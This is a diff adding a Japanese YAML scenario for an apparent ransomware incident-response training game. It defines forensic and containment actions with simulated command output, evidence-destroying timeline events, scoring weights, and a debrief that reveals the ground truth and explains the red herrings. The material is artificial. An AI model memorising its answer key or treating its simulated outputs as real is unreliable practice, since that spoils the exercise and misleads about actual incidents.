+    group: "ws-042（営業部端末）"
+    phase: investigation
+    type: investigate
+    description: |
+      端末の利用者に電話で連絡し、心当たりのある操作がなかったかを聞く。
+      深夜帯であり、つながる保証はない。
+    cost_minutes: 20
+    investigates: [ws-042]
+    yields: [ev_016]
+
+  - id: act_edr_full_scan
+    label: "全端末に EDR のフルスキャンを実行"
+    command: |
+      $ edrctl scan --all --type full --wait
+        DC01     ........ done   0 detections
+        FS01     ........ done   0 detections
+        WS-042   ........ done   0 detections
+        WS-107   ........ done   0 detections
+        WS-113   ........ done   0 detections
+
+        Signature DB : 2026-03-13 22:10 (latest)
+        Scanned      : 5 hosts / 2,841,033 files / 34m18s
+    group: "全体を横断して見る"
+    phase: investigation
+    type: investigate
+    description: |
+      全端末に EDR のフルスキャンを走らせ、既知のマルウェアシグネチャと照合する。
+      ディスク上の検体を探す作業。
+    cost_minutes: 35
+    investigates: []
+    yields: [ev_017]
+
+  - id: act_backup_config
+    label: "バックアップ運用設定の照会"
+    requires_evidence: [ev_007]
+    command: |
+      $ bkpctl job list --host WS-107 --format json | jq '.[] | {name,schedule,target}'
+        1 job
+
+      $ bkpctl job history --name nightly-cloud-sync --days 30
+        30 runs listed
+    group: "台帳・運用の記録"
+    phase: investigation
+    type: investigate
+    description: |
+      バックアップ製品の設定と実行履歴を引き、
+      どの端末が・いつ・どこへ・どれだけ送る設定になっているかを確認する。
+    cost_minutes: 15
+    investigates: []
+    yields: [ev_003]
+
+  - id: act_mail_gateway
+    label: "メールゲートウェイのログを照合"
+    requires_evidence: [ev_001, ev_007]
+    command: |
+      $ mgctl search --rcpt sato@example.com --from 2026-03-14T00:00 --to 2026-03-14T04:00
+        3 messages
+
+      $ mgctl show 4B2F91A0C7 --headers --attachments
+        headers + 1 attachment
+
+      $ Get-WinEvent -ComputerName WS-042 -LogName Microsoft-Windows-VHDMP/Operational
+        6 events
+    group: "全体を横断して見る"
+    phase: investigation
+    type: investigate
+    description: |
+      メールゲートウェイの配送ログから、対象利用者宛の受信を洗う。
+      差出人、件名、添付、認証結果（SPF/DKIM）を確認する。
+    cost_minutes: 25
+    investigates: [ws-042]
+    yields: [ev_004]
+
+  - id: act_smb_session_fs01
+    label: "fs01 の SMB セッション履歴を解析"
+    command: |
+      $ Get-WinEvent -ComputerName FS01 -FilterHashtable @{LogName='Security'; Id=4624,5140}
+        892 events
+
+      $ ... | Where-Object { $_.Properties[8].Value -eq 3 } | Group AuthenticationPackageName
+        2 groups (Kerberos / NTLM)
+
+      $ Get-SmbSession -CimSession FS01 | Format-Table ClientComputerName,ClientUserName
+        4 sessions
+    group: "fs01（ファイルサーバ）"
+    phase: investigation
+    type: investigate
+    description: |
+      fs01 のファイル共有への接続履歴を解析する。
+      どのアカウントが、どの端末から、どの認証方式で接続したかを見る。
+    cost_minutes: 30
+    investigates: [fs01, ws-042]
+    yields: [ev_006]
+
+  - id: act_memory_dump_ws042
+    label: "ws-042 のメモリダンプ取得・解析"
+    requires_evidence: [ev_001, ev_007]
+    command: |
+      $ winpmem_mini_x64.exe \\WS-042\c$\ir\ws042.raw
+        Acquiring physical memory ... 16,384 MB / 16,384 MB   (00:11:42)
+        SHA-256 recorded
+
+      $ vol.py -f ws042.raw windows.pslist
+        118 processes
+      $ vol.py -f ws042.raw windows.netscan
+        47 connections
+      $ vol.py -f ws042.raw windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"
+        key dumped
+      $ strings -el ws042.raw | grep -Ei 'http|key|sleep' | sort -u
+        2,904 lines
+    group: "ws-042（営業部端末）"
+    phase: investigation
+    type: investigate
+    tags: [volatile_capture]
+    description: |
+      稼働中の ws-042 からメモリイメージを取得して解析する。
+      実行中プロセス、確立中の接続、メモリ上の文字列、自動起動の設定を見る。
+      端末は動かしたまま行う。
+    cost_minutes: 45
+    investigates: [ws-042]
+    yields: [ev_009]
+
+  - id: act_memory_dump_fs01
+    label: "fs01 のメモリダンプ取得・解析"
+    command: |
+      $ winpmem_mini_x64.exe \\FS01\c$\ir\fs01.raw
+        Acquiring physical memory ... 32,768 MB / 32,768 MB   (00:19:05)
+
+      $ vol.py -f fs01.raw windows.pslist
+        94 processes
+      $ vol.py -f fs01.raw windows.handles --pid 6644
+        12,847 handles
+    group: "fs01（ファイルサーバ）"
+    phase: investigation
+    type: investigate
+    tags: [volatile_capture]
+    description: |
+      稼働中の fs01 からメモリイメージを取得して解析する。
+      実行中プロセスと開いているファイルハンドルを見る。サーバは止めない。
+    cost_minutes: 40
+    investigates: [fs01]
+    yields: [ev_010]
+
+  - id: act_proxy_log
+    label: "ws-042 のプロキシログを照合"
+    requires_evidence: [ev_001, ev_007]
+    command: |
+      $ zgrep '192.0.2.42' /var/log/squid/access.log.*.gz | wc -l
+        65
+
+      $ zgrep '192.0.2.42' /var/log/squid/access.log.*.gz \
+          | awk '{print $1}' | awk 'NR>1{print $1-p} {p=$1}' | datamash mean 1 sstdev 1
+        60.2   14.8
+
+      $ fwctl session list --src 192.0.2.42 --since 2026-03-14T02:00
+        1 session
+    group: "ws-042（営業部端末）"
+    phase: investigation
+    type: investigate
+    description: |
+      プロキシと境界ファイアウォールのログから、対象端末の外向き通信を
+      1リクエストずつ洗う。宛先、間隔、転送量、User-Agent を見る。
+    cost_minutes: 20
+    investigates: [ws-042]
+    yields: [ev_011]
+
+  - id: act_dlp_review
+    label: "DLP ログを精査し外部送信を確認"
+    requires_evidence: [ev_007]
+    command: |
+      $ dlpctl alerts --from 2026-03-14T00:00 --to 2026-03-14T04:00 --policy confidential-egress
+        0 alerts
+
+      $ dlpctl transfers --from 2026-03-14T00:00 --to 2026-03-14T04:00 --min-size 10MB
+        1 transfer (approved destination)
+
+      $ casbctl egress --unapproved --min-size 10MB --from 2026-03-14T00:00
+        0 transfers
+    group: "全体を横断して見る"
+    phase: investigation
+    type: investigate
+    description: |
+      DLP と CASB のログを引き、機密ファイルの外部送信が検知されていないかを確認する。
+      承認済み宛先への送信と、未承認宛先への送信を分けて見る。
+    cost_minutes: 25
+    investigates: [ws-107]
+    yields: [ev_012]
+
+  - id: act_triage_ws113
+    label: "ws-113 をトリアージ"
+    requires_evidence: [ev_005]
+    command: |
+      $ irtriage.exe --host WS-113 --collect autoruns,shimcache,tasks,persistence
+        autoruns    : 24 entries
+        shimcache   : 312 entries
+        tasks       : 61 entries
+        persistence : 0 findings
+        (00:18:44)
+
+      $ irtriage.exe --host WS-113 --timeline --from 2026-03-14T02:00 --to 2026-03-14T04:00
+        38 events
+    group: "ws-113（情報システム部端末）"
+    phase: investigation
+    type: investigate
+    description: |
+      ws-113 の自動起動項目、直近の実行履歴、スケジュールタスクを
+      自動収集ツールで一括取得して確認する。
+    cost_minutes: 25
+    investigates: [ws-113]
+    yields: [ev_013]
+
+  - id: act_backup_integrity
+    label: "バックアップの健全性を確認"
+    command: |
+      $ bkpctl verify --set FY2026-daily --generation latest
+        checksum ... OK  (14 generations present)
+
+      $ bkpctl restore --set FY2026-daily --generation 2026-03-14T01:00 \
+          --path '\\share\経理' --to /mnt/verify --limit 20
+        20 files restored ... OK
+
+      $ bkpctl repo audit --since 2026-03-13T22:00
+        write requests : 0
+    group: "台帳・運用の記録"
+    phase: investigation
+    type: investigate
+    description: |
+      バックアップからの復元を試験し、世代とデータが健全かを確認する。
+      ランサムウェア対応では復旧可否を早期に把握したい。
+    cost_minutes: 30
+    investigates: []
+    yields: [ev_018]
+
+  - id: act_ad_group_audit
+    label: "dc01 の特権グループ変更履歴を確認"
+    command: |
+      $ Get-ADGroupMember 'Domain Admins','Enterprise Admins','Schema Admins','Backup Operators'
+        4 groups queried
+
+      $ Get-WinEvent -ComputerName DC01 -FilterHashtable @{LogName='Security'; Id=4728,4732,4756;
+            StartTime='2026-02-12'}
+        0 events
+    group: "dc01（ドメインコントローラ）"
+    phase: investigation
+    type: investigate
+    description: |
+      Active Directory の特権グループ（Domain Admins 等）の
+      メンバー変更履歴を確認する。攻撃者が権限を追加していないかを見る。
+    cost_minutes: 25
+    investigates: [dc01]
+    yields: [ev_019]
+
+  # 以下2つは排他。稼働中にしか取れないものを、取得のために失う
+  - id: act_disk_image_ws042
+    label: "ws-042 を停止してディスクイメージを取得"
+    requires_evidence: [ev_001, ev_007]
+    command: |
+      $ Stop-Computer -ComputerName WS-042 -Force
+        WS-042: powered off  (揮発性の情報はここで失われる)
+
+      $ ftkimager \\.\PHYSICALDRIVE0 /mnt/ir/ws042 --e01 --frag 2G
+        Acquiring 512 GB ... done   (00:41:20)
+        MD5/SHA1 verified
+
+      $ mftecmd.exe -f ws042.E01 --csv /mnt/ir/out
+        482,913 records
+      $ RECmd.exe -d ws042/Users/sato/NTUSER.DAT --bn RecentDocs.reb
+        61 entries
+      $ AppCompatCacheParser.exe -f ws042/SYSTEM --csv /mnt/ir/out
+        1,024 entries
+    group: "ws-042（営業部端末）"
+    phase: investigation
+    type: investigate
+    description: |
+      ws-042 をシャットダウンしてディスクを取り外し、物理イメージを取得する。
+      $MFT、レジストリ、ShimCache といったディスク上の痕跡を網羅的に見られる。
+      停止が前提なので、稼働中にしか存在しない情報は取れなくなる。
+    cost_minutes: 60
+    investigates: [ws-042]
+    yields: [ev_014]
+    destroys: [ev_009]
+
+  - id: act_reboot_fs01
+    label: "fs01 をセーフモードで再起動して確認"
+    command: |
+      $ Restart-Computer -ComputerName FS01 -Wait -For WinRM
+        FS01: rebooting into Safe Mode  (稼働中プロセスの情報はここで失われる)
+        back online  (00:06:31)
+
+      $ autorunsc.exe -accepteula -a * -h \\FS01
+        31 entries
+      $ Get-WinEvent -ComputerName FS01 -FilterHashtable @{LogName='Application'; Id=524}
+        2 events
+      $ Get-ChildItem \\FS01\c$\Windows\Temp -File | Sort LastWriteTime -Desc
+        18 files
+    group: "fs01（ファイルサーバ）"
+    phase: investigation
+    type: investigate
+    description: |
+      fs01 をセーフモードで再起動し、自動起動項目とディスク上のファイルを確認する。
+      再起動するため、稼働中のプロセス情報は残らない。
+    cost_minutes: 35
+    investigates: [fs01]
+    yields: [ev_015]
+    destroys: [ev_010]
+
+  # ── 現場への指示 ──
+  # 証拠を取りに行くのではなく、証拠が消えるのを止めに行く手。
+  # 効くのは打ち終わった時刻から先だけで、既に起きたことには効かない。
+  # 速いプレイなら20分を払う意味は無い（世界が追いつく前に終わる）。
+  # 遅くなると分かっているときだけ得になる、自分の速さへの賭け。
+  - id: act_preservation_notice
+    label: "全社に証拠保全の周知を出す"
+    command: |
+      $ mail -s "[重要] 障害対応中の端末操作について" all-staff@corp.example < notice.txt
+        delivered: 412 recipients
+
+      $ helpdesk-cli script set --id first-response --file notice-hd.txt
+        1 script updated   (一次応答の文面を差し替え)
+
+      $ chatops post --channel #all-announce --pin
+        pinned
+    group: "全体への指示"
+    phase: investigation
+    type: communicate
+    description: |
+      情報システム部から全社へ、異常が出ている端末の電源断・再起動・
+      ファイルの削除を行わないよう周知する。ヘルプデスクの一次応答も
+      同じ文面に差し替え、問い合わせへの回答を揃える。
+      調査そのものは1ミリも進まない。
+    cost_minutes: 15
+    prevents: [tl_backup_roll, tl_fs01_restart, tl_field_reboot]
+
+  # ── 封じ込め・対応 ──
+  - id: act_block_c2
+    label: "C2 ドメインを境界で遮断"
+    command: |
+      $ fwctl rule add --name block-c2 --dst 198.51.100.77/32 --action deny --log
+        rule installed (edge-fw-01, edge-fw-02)
+
+      $ dnsctl sinkhole add --domain gate.php.198.51.100.77 --to 192.0.2.250
+        sinkhole active
+
+        端末は動作を継続。通信のみ遮断。
+    group: "通信だけを止める"
+    phase: response
+    type: contain
+    description: |
+      外部の C2 宛通信を境界で遮断する。端末は動いたまま、通信だけを止める。
+    cost_minutes: 10
+    targets: [ws-042]
+    investigates: []
+    side_effects:
+      business_impact: false
+
+  - id: act_isolate_ws042
+    label: "ws-042 をネットワークから隔離"
+    command: |
+      $ edrctl isolate --host WS-042 --allow-management
+        WS-042: network isolation ENABLED  (00:02:11)
+        端末は動作を継続。管理経路のみ許可。
+    group: "通信だけを止める"
+    phase: response
+    type: contain
+    description: |
+      ws-042 をネットワークから切り離す。端末は動いたまま、通信だけを止める。
+    cost_minutes: 10
+    targets: [ws-042]
+    investigates: []
+    side_effects:
+      business_impact: true
+
+  - id: act_isolate_ws107
+    label: "ws-107 をネットワークから隔離"
+    command: |
+      $ edrctl isolate --host WS-107 --allow-management
+        WS-107: network isolation ENABLED  (00:02:04)
+        端末は動作を継続。管理経路のみ許可。
+    group: "通信だけを止める"
+    phase: response
+    type: contain
+    description: |
+      ws-107 をネットワークから切り離す。端末は動いたまま、通信だけを止める。
+    cost_minutes: 10
+    targets: [ws-107]
+    investigates: []
+    side_effects:
+      business_impact: true
+
+  - id: act_shutdown_fs01
+    label: "fs01 を停止"
+    command: |
+      $ Stop-Service LanmanServer -Force -ComputerName FS01
+        file share offline
+      $ Stop-Computer -ComputerName FS01 -Force
+        FS01: powered off  (00:03:48)
+
+        \\FS01\share への接続はすべて切断された。
+    group: "資産を停止する"
+    phase: response
+    type: contain
+    description: |
+      fs01 を停止する。ファイル共有は使えなくなる。
+    cost_minutes: 15
+    targets: [fs01]
+    investigates: []
+    destroys: [ev_010]
+    side_effects:
+      business_impact: true
+
+  - id: act_shutdown_dc01
+    label: "dc01 を停止"
+    command: |
+      $ Stop-Computer -ComputerName DC01 -Force
+        DC01: powered off  (00:04:02)
+
+        ドメイン認証が停止。DC01 に依存する全ホストが実質停止。
+    group: "資産を停止する"
+    phase: response
+    type: contain
+    description: |
+      dc01 を停止する。ドメイン認証が止まる。
+    cost_minutes: 15
+    targets: [dc01]
+    investigates: []
+    side_effects:
+      business_impact: true
+
+  - id: act_reset_credentials
+    label: "dc01 を一時停止してドメイン資格情報を一括リセット"
+    command: |
+      $ Stop-Service NTDS -Force -ComputerName DC01
+        directory service stopped
+
+      $ Get-ADUser -Filter * | Set-ADAccountPassword -Reset -NewPassword (New-Password)
+        47 accounts reset
+      $ Reset-ComputerMachinePassword -Server DC01
+        5 computer accounts reset
+
+      $ Start-Service NTDS -ComputerName DC01
+        directory service started  (00:14:55)
+    group: "資産を停止する"
+    phase: response
+    type: contain
+    description: |
+      dc01 を一時停止し、全ドメインアカウントの資格情報をリセットする。
+    cost_minutes: 20
+    targets: [dc01]
+    investigates: []
+    side_effects:
+      business_impact: true
+
+# フェーズは2つ。不可逆な移行は、必ず判断を伴うものだけにする（SPEC 3.8）。
+# 何を先に見るかは requires_evidence の連鎖が決めるので、
+# 「まだ調査フェーズに入っていないから押せない」という門は置かない。
+# 時間が経つと向こうから入ってくること。圧力だけを運び、答えは運ばない。
+# 折れ点（270→150分）の前後に置いて、加速を数値ではなく声で気づかせる。
+# 時間が経つと向こうから入ってくること（SPEC 5.10）。
+# どれも学習者に不利にしか働かない。奪うか、費用の変化を告げるか。
+# 何も変えない出来事はローダが拒否する（赤い枠の付いた飾りになるため）。
+#
+# 誰が悪いという話ではない。復旧を急ぐ現場判断も、固まった端末の再起動も、
+# それ自体は正しい行動である。揮発性の証拠は、そういう善意で普通に消える。
+timeline:
+  - id: tl_accel
+    at_minutes: 145
+    label: "監視センターから追加連絡"
+    text: |
+      「暗号化の進み方が速くなっています。
+        さっきまでの倍くらいのペースで拡がっているように見えます。」
+    heralds: acceleration     # 折れ点（150分）の唯一の予告
+
+  - id: tl_fs01_restart
+    at_minutes: 200
+    label: "運用チームから連絡"
+    text: |
+      「fs01 が応答しなくなっていたので、一度再起動をかけました。
+        業務が止まっているので、復旧を優先すべきと判断しました。」
+    destroys: [ev_010]        # 稼働中だった暗号化バイナリの痕跡
+    averted_label: "運用チームから連絡"
+    averted_text: |
+      「fs01 が応答しないので再起動しようとしたのですが、
+        周知が回っていたので手を止めました。そのままにしてあります。」
+
+  - id: tl_backup_roll
+    at_minutes: 210
+    label: "バックアップ運用チームから連絡"
+    text: |
+      「世代がひとつ落ちました。保持数の上限に達したので、
+        いちばん古いスナップショットから順に消えていきます。」
+    destroys: [ev_018]        # 暗号化前の世代から復元できるという確認
+    averted_label: "バックアップ運用チームから連絡"
+    averted_text: |
+      「保持数の上限に達しましたが、周知を受けて世代の削除を止めました。
+        当面は今の状態のまま残します。」
+
+  - id: tl_field_reboot
+    at_minutes: 270
+    label: "ヘルプデスクから連絡"
+    text: |
+      「動かなくなった端末を再起動する動きが、現場で始まっています。
+        こちらからは何も出していないので、止めようがありません。」
+    destroys: [ev_009]        # メモリ上にしか無かった C2 設定と Run キー
+    averted_label: "ヘルプデスクから連絡"
+    averted_text: |
+      「端末を再起動していいかという問い合わせが続いています。
+        先の周知どおり、そのままにしておくよう返しています。」
+
+phases:
+  - id: investigation
+    label: "調査"
+    advance_label: "対応フェーズに移る"
+
+  - id: response
+    label: "封じ込め・対応"
+    advance_label: null
+    requires_assessment: true
+
+damage:
+  model: exponential
+  params:
+    base: 350.7
+    rate: 0.15
+  acceleration:
+    threshold_minutes: 150
+    multiplier: 2.5
+  containment_effect:
+    on_correct_containment: 0.2
+    on_partial: 0.6
+    on_incorrect: 1.0
+
+scoring:
+  fact_layer:
+    metrics:
+      - id: assessment_precision
+        label: "被疑判定の適合率"
+        direction: higher_is_better
+      - id: assessment_recall
+        label: "被疑判定の再現率"
+        direction: higher_is_better
+      - id: persistence_missed
+        label: "永続化の見落とし"
+        direction: lower_is_better
+        weight_multiplier: 2.0
+      - id: misled_score
+        label: "誤導追従度"
+        direction: lower_is_better
+      - id: unresolved_questions
+        label: "未解消論点を抱えたままの判断"
+        direction: lower_is_better
+    weights:
+      assessment_precision:  0.25
+      assessment_recall:     0.25
+      persistence_missed:    0.10
+      misled_score:          0.20
+      unresolved_questions:  0.20
+
+  policy_layer:
+    constraint_penalty: 0.15
+
+  consequence_layer:
+    display_only:
+      - elapsed_minutes
+      - total_damage
+      - business_impact
+      - evidence_preserved
+      - containment_completeness
+    business_impact_horizon_minutes: 480
+    normalization:
+      total_damage:             { worst: 14000, best: 0 }
+      business_impact:          { worst: 1200,  best: 0 }
+      evidence_preserved:       { worst: 0.0,  best: 1.0 }
+      containment_completeness: { worst: 0.0,  best: 1.0 }
+
+  composite:
+    method: weighted_sum
+    fact_weight: 0.7
+
+retrospective:
+  minimal_path:
+    compute: true
+    label: "事後的に見た最短経路"
+    disclaimer: |
+      これは答えを知った上で算出した参照値です。
+      実際の対応では、外れを引くことは避けられません。
+      この差分は無駄ではなく、不確実性の代価です。
+  counterfactuals:
+    compute: true
+  unresolved_review:
+    compute: true
+
+debrief:
+  reveal_ground_truth: true
+  misleading_explanations:
+    ev_007: |
+      ws-107 の外部通信は、毎日 02:15 に起動するクラウドバックアップの
+      定時ジョブです。転送量も宛先も直近30日と変わっていません。
+      攻撃の発生時刻と近かったため、攻撃の痕跡に見えました。
+    ev_005: |
+      ws-113 の管理者ログオンは、承認済みの定例パッチ適用作業
+      (CHG-2026-0271) によるものです。作業時間帯は 02:00-04:00 で
+      承認されており、多数のネットワークログオンは想定内の挙動です。
+  key_lessons:
+    - "時刻の近さは関係の証明にならない。同時刻の事象がすべて同じ原因とは限らない。"
+    - "通常時の姿を知らないと、異常かどうかは判定できない。台帳や運用設定は最も安価な棄却手段である。"
+    - "侵入経路が分からないまま封じ込めても、同じ経路から再び入られる。"
+    - "揮発性の情報は封じ込めで失われる。取得の順序そのものが判断である。"
+  replay_suggestions:
+    - policy: evidence_preservation
+      hint: |
+        同じ状況を「証拠保全最優先」で解くと、封じ込めの順序が変わります。
+        揮発性証拠を取ってから動く必要があり、その分だけ被害が伸びます。
+    - policy: damage_minimization
+      hint: |
+        「被害最小化最優先」では、根拠が固まる前に止める判断が許容されます。
+        同じ行動列でも評価が変わることを確かめてください。
